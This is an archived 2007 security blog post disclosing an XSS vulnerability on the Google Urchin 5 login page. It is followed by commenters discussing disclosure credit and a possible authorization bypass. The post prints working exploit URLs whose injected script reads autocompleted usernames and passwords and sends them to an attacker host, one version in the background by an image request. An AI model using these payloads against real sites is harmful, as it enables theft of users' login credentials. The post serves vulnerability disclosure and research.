<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Google Urchin Password Theft Madness</title><meta name="description" content="There is a trivially exploitable XSS vul on Google Urchin Web Analytics 5's login page. The vulnerability has been tested on versions `5.6.00r2`, `5.7.01`, `5.7.02` and `5.7.03` (latest). Previous versions are most likely to be affected as well. In case you didn't know, Google Urchin is the install version of Google Analytics."><meta property="name" content="Google Urchin Password Theft Madness"><meta itemprop="name" content="Google Urchin Password Theft Madness"><meta property="description" content="There is a trivially exploitable XSS vul on Google Urchin Web Analytics 5's login page. The vulnerability has been tested on versions `5.6.00r2`, `5.7.01`, `5.7.02` and `5.7.03` (latest). Previous versions are most likely to be affected as well. In case you didn't know, Google Urchin is the install version of Google Analytics."><meta itemprop="description" content="There is a trivially exploitable XSS vul on Google Urchin Web Analytics 5's login page. The vulnerability has been tested on versions `5.6.00r2`, `5.7.01`, `5.7.02` and `5.7.03` (latest). Previous versions are most likely to be affected as well. In case you didn't know, Google Urchin is the install version of Google Analytics."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fgoogle-urchin-password-theft-madness%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fgoogle-urchin-password-theft-madness%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/google-urchin-password-theft-madness/"><meta property="og:title" content="Google Urchin Password Theft Madness"><meta property="og:description" content="There is a trivially exploitable XSS vul on Google Urchin Web Analytics 5's login page. The vulnerability has been tested on versions `5.6.00r2`, `5.7.01`, `5.7.02` and `5.7.03` (latest). Previous versions are most likely to be affected as well. In case you didn't know, Google Urchin is the install version of Google Analytics."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fgoogle-urchin-password-theft-madness%2F?w=1024"><meta name="twitter:title" content="Google Urchin Password Theft Madness"><meta name="twitter:description" content="There is a trivially exploitable XSS vul on Google Urchin Web Analytics 5's login page. The vulnerability has been tested on versions `5.6.00r2`, `5.7.01`, `5.7.02` and `5.7.03` (latest). Previous versions are most likely to be affected as well. In case you didn't know, Google Urchin is the install version of Google Analytics."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fgoogle-urchin-password-theft-madness%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/blog/">Blog</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Google Urchin Password Theft Madness</h1><div class="date">Mon, 24 Sep 2007 14:14:49 GMT</div><div class="author">by pagvac</div><div id="post-content"><p>There is a trivially exploitable XSS vul on <a href="http://www.google.com/search?q=intext%3A%22Urchin+Web+Analytics+v5%22">Google Urchin Web Analytics 5</a>&#39;s login page. The vulnerability has been tested on versions <code>5.6.00r2</code>, <code>5.7.01</code>, <code>5.7.02</code> and <code>5.7.03</code> (latest). Previous versions are most likely to be affected as well. In case you didn&#39;t know, <a href="http://www.google.com/analytics/urchin_downloads.html">Google Urchin</a> is the <strong>install</strong> version of Google Analytics.</p>
<p>I reported the issue to Google back on Jul 25 and was confirmed by their security team. They are now working on a fix. My original plan was to publish this info after a fix would be released. However, the issue <a href="http://ha.ckers.org/blog/20070823/xss-and-possible-information-disclosure-in-urchin/">has also been found</a> by other folks about a month ago. As usual, the researcher loses credit when following the responsible disclosure route. Here is the boring POC:</p>
<pre><code>http://target/session.cgi?&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;&lt;!--</code></pre><p>You might have heard before that a XSS vulnerability on a login page is nasty. However most people think that the worst thing you can do is inject a form in order to perform a phishing attack. Although it&#39;s true this is a good example of what you can do, we can also do more advanced XSS phishing attacks that are even harder to detect. My two favorite tricks when finding a XSS vul on a login page are:</p>
<ul>
<li><p><strong>Overwriting</strong> the login form&#39;s <code>action</code> attribute so that the victim&#39;s username and password are stolen when clicking on Login</p>
</li>
<li><p><strong>Stealing</strong> autocomplete data so that victim username and password are stolen <em>by simply clicking on our exploit URL</em> (juicy!)</p>
<p>  Anyway, let&#39;s get to the point. I know that you&#39;re sick of XSS PoCs that only open alert boxes. So here is a exploit URL that will steal the victim&#39;s username and password by simply clicking on it. The only requirement is that the victim is using the &quot;autocomplete passwords&quot; feature, aka &quot;Remember passwords for sites&quot;:</p>
<p>  <a href="http://target/session.cgi?&quot;&gt;">http://target/session.cgi?&quot;&gt;</a></form><script>setTimeout("location%3d'<a href="http://evil/?usr%3d&#39;%2bdocument.forms%5B0%5D.user.value%2b&#39;%26pwd%3d&#39;%2bdocument.forms%5B0%5D.pass.value;&quot;,1500">http://evil/?usr%3d&#39;%2bdocument.forms[0].user.value%2b&#39;%26pwd%3d&#39;%2bdocument.forms[0].pass.value;&quot;,1500</a>);</script>&lt;!--</p>
<p>  Using <code>location</code> is great for redirecting information to third-party sites. The problem is that the current window will change to show the evil site. Although this is great for demo purposes, it sucks when it comes to being stealth, since the victim can actually see his/her credentials being sent to another website on the address bar. Instead, we can dynamically create an image with JavaScript so <em>the credentials are stolen in the background:</em></p>
<p>  <a href="http://target/session.cgi?&quot;&gt;">http://target/session.cgi?&quot;&gt;</a></form><script>h%3dnew%20Image();setTimeout("h.src%3d'<a href="http://evil/?usr%3d&#39;%2bdocument.forms%5B0%5D.user.value%2b&#39;%26pwd%3d&#39;%2bdocument.forms%5B0%5D.pass.value;&quot;,1500">http://evil/?usr%3d&#39;%2bdocument.forms[0].user.value%2b&#39;%26pwd%3d&#39;%2bdocument.forms[0].pass.value;&quot;,1500</a>);</script>&lt;!--</p>
</li>
</ul>
<p>The following video shows the previous exploit in action. I don&#39;t think the quality of the video is that good, but oh well. Basically what it shows is how after visiting the exploit URL, the username and password are sent to google.com in the background. I use Paros in the video to demonstrate that the credentials do indeed get sent to google.com.</p>
<iframe class="video" src="//www.youtube.com/embed/wCUovL9WLVQ" frameborder="0" allowfullscreen></iframe>

<p>If you look at the code, you&#39;ll notice that we wait 1.5 secs using the <em>setTimeout()</em> function before forwarding the credentials to the evil site. The reason for this is because we need to let the browser auto-complete the fields before performing the redirect. Otherwise the value of the username and password field would be blank by the time we steal them. </p>
<p><em>The PoC has been tested on the latest version of FF (2.0.0.7 at time of writing) and does _not</em> work on IE 7, but <em>might</em> work on IE 6. This doesn&#39;t mean you cannot do a auto-complete password theft attack on IE 7, it just needs a bit of more work! If you want to know the reason behind this difference is that IE 7 requires the user to first type or choose the username from the auto-complete drop-down menu, <em>before_ the password field is automatically filled.</em></p>
</div><div id="post-comments"><p><em>Archived Comments</em></p><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/997a9fa55e557e2aa8262a07758b161d?s=256&amp;d=retro" alt="MustLive"><span class="post-comment-author">MustLive</span><div class="post-comment-content">Adrian.

As I wrote at my site month ago (http://websecurity.com.ua/1283/) about this XSS hole  in Urchin, RSnake already wrote about this hole. Like you also mentioned about. But as I and RSnake wrote, there is not only XSS, but also Authorization bypass vulnerability in Urchin. Which give possibility to look at statistic without any login and password!

<blockquote>I know that youâ€™re sick of XSS PoCs that only open alert boxes.</blockquote>
I'm not, I like alert boxes :-), especially alert(document.cookie).

Nevertheless, man, nice XSS PoCs and video ;-).</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/44c5e290ccf283471210752d0b1ed6df?s=256&amp;d=retro" alt="djteller"><span class="post-comment-author">djteller</span><div class="post-comment-content">Nice work man.
Sorry about the credit issue, but dont worry, you got our respect.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&amp;d=retro" alt="Adrian Pastor"><span class="post-comment-author">Adrian Pastor</span><div class="post-comment-content">Hi MustLive:

Copied and pasted from this very same post:

<blockquote>I reported the issue to Google back on Jul 25 and was confirmed by their security team. They are now working on a fix. My original plan was to publish this info after a fix would be released. However, the issue has also been found by other folks about a month ago.</blockquote>

In other words, I do mention that it's been publicly made a month ago by others, but ALSO that I reported it to Google 2 months ago and that I was waiting for them to fix it BEFORE making it public.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/997a9fa55e557e2aa8262a07758b161d?s=256&amp;d=retro" alt="MustLive"><span class="post-comment-author">MustLive</span><div class="post-comment-content">Hi Adrian!

No need to paste your words, I read your whole post carefully ;-). I understand that you was first who found this hole and I believe you (and Google also know that you was first who tell them about this XSS). Some people who found this hole after you outstrip you with disclosure, but you was the first discoverer, so you have respect of me and security community.

I understand you with this situation, when other guys officially disclosed your hole before you. This incidents sometimes happens in webappsec world. I regularly have such experience, when people disclosing holes which I first discover before me, or when people disclosing holes many months after my disclosure.

What I wrote in my previous comment (and what I wrote at my site), that there is another hole in Urchin. It is Authorization bypass vulnerability (which as I know was found by RSnake and you didn't mention it in your post). This one gives possibility to enter into account without any login and password. It is also interesting hole as your XSS.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&amp;d=retro" alt="Adrian Pastor"><span class="post-comment-author">Adrian Pastor</span><div class="post-comment-content">Hey MustLive,

Thanks for your kind words, very much appreciated!

I did read about the unauthenticated access issue and left my comments here: http://ha.ckers.org/blog/20070823/xss-and-possible-information-disclosure-in-urchin/

<blockquote><p>Back in July, when I was searching some examples in Google also noticed that some sites have the Urchin stats wide open, but I thought this was a configuration problem as opposed to a bug.</p>

<p>Are you guys sure there is a <q>authorization bypass hole</q>?</p></blockquote>

MustLive, is this a 100% verified issue? Have you guys replicated this in a lab environment? I can't make it work on my test installation.</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2021 <a href=""></a>. All rights reserved.</p></footer></body></html>